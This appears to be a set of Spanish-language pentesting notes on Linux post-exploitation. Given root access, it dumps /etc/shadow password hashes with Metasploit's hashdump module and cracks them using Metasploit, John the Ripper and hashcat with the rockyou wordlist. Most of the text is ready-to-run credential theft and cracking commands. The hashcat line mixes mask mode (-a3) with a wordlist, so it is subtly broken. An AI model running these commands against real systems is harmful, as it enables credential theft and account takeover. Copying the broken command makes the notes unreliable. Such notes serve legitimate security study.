Teniendo usuario root, se puede dumpear credenciales (/etc/shadow).

Opción con metasploit:
Solo es necesario pasarle la session que se tiene iniciada como root, esto guarda los hashes.
```
use post/linux/gather/hashdump
set SESSION 1
exploit
```

-----
## Crackeo de contraseñas

| valor | algoritmo de hash |
| ----- | ----------------- |
| $1    | MD5               |
| $2    | Blowfish          |
| $5    | SHA-256           |
| $6    | SHA-512           |
#### Usando Metasploit
Realizando el paso anterior, se usa modulo para realizar el crackeo de los hashes, 
```
use auxiliary/analyze/crack_linux
set SHA512 true
run
```
#### Usando johntheripper
john --format=sha512crypt hash.txt --wordlist=/usr/share/wordlist/rockyou.txt

#### Usando hashcat
hashcat -a3 -m 1800 hash.txt /usr/share/wordlist/rockyou.txt